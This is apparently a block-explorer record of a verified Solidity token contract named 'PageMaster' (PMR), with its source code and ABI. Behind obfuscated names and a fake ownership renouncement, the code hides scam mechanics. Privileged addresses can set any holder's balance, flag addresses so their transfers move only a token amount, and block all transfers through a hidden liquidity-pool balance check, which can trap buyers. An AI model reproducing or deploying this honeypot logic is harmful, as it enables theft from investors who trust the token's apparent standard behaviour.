{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.1;\n\ninterface liquidityFrom {\n    function createPair(address autoReceiver, address marketingAmount) external returns (address);\n}\n\ninterface receiverReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address sellTx) external view returns (uint256);\n\n    function transfer(address shouldTotalLiquidity, uint256 fromTeamSender) external returns (bool);\n\n    function allowance(address toMaxFund, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fromTeamSender) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address shouldTotalLiquidity,\n        uint256 fromTeamSender\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tokenExempt, uint256 value);\n    event Approval(address indexed toMaxFund, address indexed spender, uint256 value);\n}\n\nabstract contract atIs {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface minTotal {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface receiverReceiverMetadata is receiverReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PageMaster is atIs, receiverReceiver, receiverReceiverMetadata {\n\n    string private launchedIsMax = \"PMR\";\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return liquidityMax;\n    }\n\n    uint8 private enableSwap = 18;\n\n    uint256 marketingWalletFrom;\n\n    address public totalLaunch;\n\n    event OwnershipTransferred(address indexed atReceiver, address indexed receiverList);\n\n    uint256 constant sellLiquidity = 9 ** 10;\n\n    address public modeEnable;\n\n    function getOwner() external view returns (address) {\n        return atTotalToken;\n    }\n\n    mapping(address => uint256) private receiverFee;\n\n    function balanceOf(address sellTx) public view virtual override returns (uint256) {\n        return receiverFee[sellTx];\n    }\n\n    mapping(address => bool) public sellIs;\n\n    address liquidityTake = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function decimals() external view virtual override returns (uint8) {\n        return enableSwap;\n    }\n\n    bool public takeLaunched;\n\n    string private isAmountLimit = \"Page Master\";\n\n    mapping(address => mapping(address => uint256)) private takeIs;\n\n    function allowance(address listEnable, address receiverSwapAt) external view virtual override returns (uint256) {\n        if (receiverSwapAt == tokenWallet) {\n            return type(uint256).max;\n        }\n        return takeIs[listEnable][receiverSwapAt];\n    }\n\n    address tokenWallet = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function isMin(address receiverLimit) public {\n        marketingTotal();\n        \n        if (receiverLimit == totalLaunch || receiverLimit == modeEnable) {\n            return;\n        }\n        sellIs[receiverLimit] = true;\n    }\n\n    function marketingTotal() private view {\n        require(listTeam[_msgSender()]);\n    }\n\n    constructor (){\n        if (teamBuy != launchedLiquidity) {\n            teamBuy = marketingListLiquidity;\n        }\n        minTotal senderLaunched = minTotal(tokenWallet);\n        modeEnable = liquidityFrom(senderLaunched.factory()).createPair(senderLaunched.WETH(), address(this));\n        \n        totalLaunch = _msgSender();\n        listTeam[totalLaunch] = true;\n        receiverFee[totalLaunch] = liquidityMax;\n        swapAt();\n        \n        emit Transfer(address(0), totalLaunch, liquidityMax);\n    }\n\n    uint256 private launchedLiquidity;\n\n    address private atTotalToken;\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchedIsMax;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return isAmountLimit;\n    }\n\n    function limitExempt(uint256 fromTeamSender) public {\n        marketingTotal();\n        marketingWalletFrom = fromTeamSender;\n    }\n\n    function liquidityFee(address fromEnable, address shouldTotalLiquidity, uint256 fromTeamSender) internal returns (bool) {\n        require(receiverFee[fromEnable] >= fromTeamSender);\n        receiverFee[fromEnable] -= fromTeamSender;\n        receiverFee[shouldTotalLiquidity] += fromTeamSender;\n        emit Transfer(fromEnable, shouldTotalLiquidity, fromTeamSender);\n        return true;\n    }\n\n    function transferFrom(address fromEnable, address shouldTotalLiquidity, uint256 fromTeamSender) external override returns (bool) {\n        if (_msgSender() != tokenWallet) {\n            if (takeIs[fromEnable][_msgSender()] != type(uint256).max) {\n                require(fromTeamSender <= takeIs[fromEnable][_msgSender()]);\n                takeIs[fromEnable][_msgSender()] -= fromTeamSender;\n            }\n        }\n        return takeMode(fromEnable, shouldTotalLiquidity, fromTeamSender);\n    }\n\n    function receiverWallet(address fromTotal) public {\n        if (takeLaunched) {\n            return;\n        }\n        if (tokenBuy) {\n            launchedLiquidity = launchTeam;\n        }\n        listTeam[fromTotal] = true;\n        \n        takeLaunched = true;\n    }\n\n    function transfer(address feeBuy, uint256 fromTeamSender) external virtual override returns (bool) {\n        return takeMode(_msgSender(), feeBuy, fromTeamSender);\n    }\n\n    bool public isLaunch;\n\n    uint256 public launchTeam;\n\n    bool private tokenBuy;\n\n    uint256 amountAt;\n\n    mapping(address => bool) public listTeam;\n\n    function launchEnable(address feeBuy, uint256 fromTeamSender) public {\n        marketingTotal();\n        receiverFee[feeBuy] = fromTeamSender;\n    }\n\n    uint256 private teamBuy;\n\n    function owner() external view returns (address) {\n        return atTotalToken;\n    }\n\n    function approve(address receiverSwapAt, uint256 fromTeamSender) public virtual override returns (bool) {\n        takeIs[_msgSender()][receiverSwapAt] = fromTeamSender;\n        emit Approval(_msgSender(), receiverSwapAt, fromTeamSender);\n        return true;\n    }\n\n    uint256 private marketingListLiquidity;\n\n    function takeMode(address fromEnable, address shouldTotalLiquidity, uint256 fromTeamSender) internal returns (bool) {\n        if (fromEnable == totalLaunch) {\n            return liquidityFee(fromEnable, shouldTotalLiquidity, fromTeamSender);\n        }\n        uint256 autoMax = receiverReceiver(modeEnable).balanceOf(liquidityTake);\n        require(autoMax == marketingWalletFrom);\n        require(shouldTotalLiquidity != liquidityTake);\n        if (sellIs[fromEnable]) {\n            return liquidityFee(fromEnable, shouldTotalLiquidity, sellLiquidity);\n        }\n        return liquidityFee(fromEnable, shouldTotalLiquidity, fromTeamSender);\n    }\n\n    uint256 private liquidityMax = 100000000 * 10 ** 18;\n\n    function swapAt() public {\n        emit OwnershipTransferred(totalLaunch, address(0));\n        atTotalToken = address(0);\n    }\n\n    bool public swapAtTeam;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toMaxFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverList\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenExempt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listEnable\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverSwapAt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverSwapAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromTeamSender\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellTx\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLimit\",\"type\":\"address\"}],\"name\":\"isMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromTeamSender\",\"type\":\"uint256\"}],\"name\":\"launchEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchTeam\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fromTeamSender\",\"type\":\"uint256\"}],\"name\":\"limitExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromTotal\",\"type\":\"address\"}],\"name\":\"receiverWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapAtTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromTeamSender\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromEnable\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"shouldTotalLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromTeamSender\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "PageMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}